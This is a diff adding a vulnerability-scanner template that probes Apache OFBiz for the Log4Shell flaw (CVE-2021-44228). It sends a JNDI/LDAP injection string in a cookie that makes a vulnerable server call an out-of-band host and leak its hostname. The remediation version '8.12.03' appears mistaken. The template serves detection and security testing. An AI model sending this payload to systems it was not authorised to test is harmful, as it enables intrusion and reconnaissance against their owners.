@@ -1,0 +1,66 @@
+id: apache-ofbiz-log4j-rce
+
+info:
+  name: Apache OFBiz - JNDI Remote Code Execution (Apache Log4j)
+  author: pdteam
+  severity: critical
+  description: |
+    Apache OFBiz is affected by a remote code execution vulnerability in the bundled Apache Log4j logging library. Apache Log4j is vulnerable due to insufficient protections on message lookup substitutions when dealing with user controlled input. A remote, unauthenticated attacker can exploit this, via a web request, to execute arbitrary code with the permission level of the running Java process.
+  remediation: Upgrade to Apache OFBiz version 8.12.03 or later.
+  reference:
+    - https://issues.apache.org/jira/browse/OFBIZ-12449
+    - https://ofbiz.apache.org/
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:apache:ofbiz:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    shodan-query: http.html:"Apache OFBiz"
+    product: ofbiz
+    vendor: apache
+  tags: cve,cve2021,ofbiz,oast,log4j,rce,apache,jndi,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        GET /webtools/control/main HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: OFBiz.Visitor=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.cookie.{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 4a0a00473045022100ea7e5c49a49c206eb5aa713deb1ae88bc96cf5b6079b1093e83a6628bb0dd61102201f287ec9425f7b954b7b482db9de51a142c4aade968f864f8b5fcfb062be723d:922c64590222798bb761d5b6d8e72950
